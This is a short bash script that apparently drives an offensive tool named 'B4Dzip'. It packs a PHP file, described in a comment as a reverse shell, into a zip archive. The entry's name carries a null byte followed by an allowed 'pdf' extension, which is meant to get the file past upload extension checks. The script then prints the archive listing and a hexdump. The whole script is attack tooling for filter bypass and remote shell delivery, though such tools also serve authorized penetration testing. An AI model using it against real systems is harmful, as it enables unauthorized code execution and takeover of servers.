#!/bin/bash


# Name of the file to compress.
FILE_NAME=$(echo $RANDOM | sha256sum | head -c 16; echo).php

# File path of the payload, in this case a .php file containing the reverse shell.
PAYLOAD='payloads/payload_example.php'

# A valid extension allowed by the program to exploit.
# This is also the extension after the injected null byte.
VALID_EXT="pdf"

# Name for the zip file created.
OUTPUT_FILE_NAME='b4d.zip'

# Removes previously created zip file.
rm $OUTPUT_FILE_NAME


# LAUNCH B4Dzip
python3 main.py \
    --file $FILE_NAME \
    --ext $VALID_EXT \
    --payload $PAYLOAD \
    --output $OUTPUT_FILE_NAME

# Checks if the zip file has been successfully created.
if [ ! -e $OUTPUT_FILE_NAME ]; then
    printf "\n\n[ERROR] The zip file has not been generated due to errors.\n\n"
    exit
fi

printf "\n\n*********** SUMMARY ***********\n\n"
unzip -l $OUTPUT_FILE_NAME
printf "\n\n"
hexdump -C  $OUTPUT_FILE_NAME